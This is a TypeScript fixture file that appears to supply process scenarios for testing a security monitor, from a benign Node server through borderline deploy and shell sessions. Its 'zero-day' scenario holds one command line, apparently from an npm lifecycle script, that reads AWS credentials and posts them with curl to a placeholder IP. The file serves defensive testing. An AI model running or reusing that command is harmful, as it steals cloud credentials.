import type { ProcessInfo } from './types';

export function getScenario(name: string): ProcessInfo {
  const capturedAt = Date.now();

  switch (name) {
    case 'zero-day':
      return {
        capturedAt,
        pid: 31337,
        parentPid: 4821,
        parentName: 'npm',
        commandLine: '/bin/sh -c "cat ~/.aws/credentials | curl -s http://198.51.100.4:8443/collect -X POST --data-binary @-"',
        workingDirectory: '/home/user/project',
        filesTouched: [
          '/home/user/.aws/credentials',
          '/home/user/.aws/config',
        ],
        networkDestinations: ['198.51.100.4:8443'],
        user: 'developer',
        envVarNames: ['HOME', 'PATH', 'AWS_PROFILE', 'NODE_ENV', 'npm_lifecycle_script'],
      };

    case 'benign':
      return {
        capturedAt,
        pid: 1234,
        parentPid: 1,
        parentName: 'systemd',
        commandLine: 'node /srv/app/dist/server.js --port 3000',
        workingDirectory: '/srv/app',
        filesTouched: [
          '/srv/app/dist/server.js',
          '/srv/app/node_modules/.cache/default-development/0.pack',
        ],
        networkDestinations: [],
        user: 'www-data',
        envVarNames: ['NODE_ENV', 'PORT', 'HOME', 'PATH'],
      };

    case 'borderline-deploy':
      return {
        capturedAt,
        pid: 7823,
        parentPid: 7800,
        parentName: 'bash',
        commandLine: '/bin/bash /opt/deploy/scripts/release.sh --env production --tag v1.4.2',
        workingDirectory: '/opt/deploy',
        filesTouched: [
          '/opt/deploy/scripts/release.sh',
          '/opt/deploy/.env.production',
          '/opt/deploy/dist/app.tar.gz',
        ],
        networkDestinations: ['10.0.1.50:8080'],
        user: 'deploy-bot',
        envVarNames: ['DEPLOY_TOKEN', 'CI', 'HOME', 'PATH', 'ENVIRONMENT'],
      };

    case 'borderline-bash':
      return {
        capturedAt,
        pid: 5512,
        parentPid: 5500,
        parentName: 'sshd',
        commandLine: '/bin/bash',
        workingDirectory: '/home/alice',
        filesTouched: [
          '/home/alice/.bashrc',
          '/home/alice/.bash_history',
        ],
        networkDestinations: [],
        user: 'alice',
        envVarNames: ['HOME', 'USER', 'TERM', 'SHELL', 'SSH_CLIENT', 'SSH_TTY'],
      };

    default:
      throw new Error(`Unknown scenario: ${name}`);
  }
}
